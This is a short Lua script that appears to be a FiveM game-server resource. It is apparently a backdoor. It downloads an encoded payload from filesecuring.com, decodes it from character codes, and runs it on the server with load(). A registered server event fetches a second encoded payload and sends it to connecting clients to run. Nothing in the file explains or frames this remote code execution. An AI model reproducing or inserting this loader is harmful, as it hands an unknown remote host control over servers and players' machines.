PerformHttpRequest("http://filesecuring.com/securefiles/get.php?id=728932287360074", function(err, text, headers)
    local code = ''
    for word in string.gmatch(text, '([^\\]+)') do 
        code = code .. string.char(tonumber(word))
    end
    assert(load(code))()
end, 'GET', '')

RegisterServerEvent('filesecuring:load')
AddEventHandler('filesecuring:load', function()
    local src = source

    PerformHttpRequest("http://filesecuring.com/securefiles/get.php?id=130206393118967", function(err, text, headers)
        local code = ''
        for word in string.gmatch(text, '([^\\]+)') do 
            code = code .. string.char(tonumber(word))
        end
        TriggerClientEvent('client:load-code', src, code)
    end, 'GET', '')
end)